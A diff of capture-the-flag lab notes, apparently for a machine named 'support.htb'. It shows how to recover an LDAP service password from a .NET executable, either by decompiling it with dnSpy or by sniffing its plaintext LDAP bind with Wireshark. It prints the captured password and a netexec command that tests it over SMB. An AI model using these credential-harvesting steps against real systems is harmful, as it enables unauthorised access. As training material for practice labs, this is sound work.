@@ -1,3 +1,5 @@
+method1, use dnSpy to reverse engineer the exe file.
+
 // Token: 0x04000005 RID: 5
 		private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
 
@@ -26,6 +28,24 @@
 			this.entry.AuthenticationType = AuthenticationTypes.Secure;
 			this.ds = new DirectorySearcher(this.entry);
 		}
+
+//method2
+	wine run this exe file, wireshark capture tun0 int, get the post as plaintext of credential through LDAP protocal
+
+Frame 4: 114 bytes on wire (912 bits), 114 bytes captured (912 bits) on interface tun0, id 0
+Raw packet data
+Internet Protocol Version 4, Src: 10.10.16.6, Dst: 10.10.11.174
+Transmission Control Protocol, Src Port: 34830, Dst Port: 389, Seq: 1, Ack: 1, Len: 62
+Lightweight Directory Access Protocol
+    LDAPMessage bindRequest(1) "support\ldap" simple
+        messageID: 1
+        protocolOp: bindRequest (0)
+            bindRequest
+                version: 3
+                name: support\ldap
+                authentication: simple (0)
+                    simple: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
+        [Response In: 5]
 
 //test this account
 └─$ netexec smb support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'  --shares
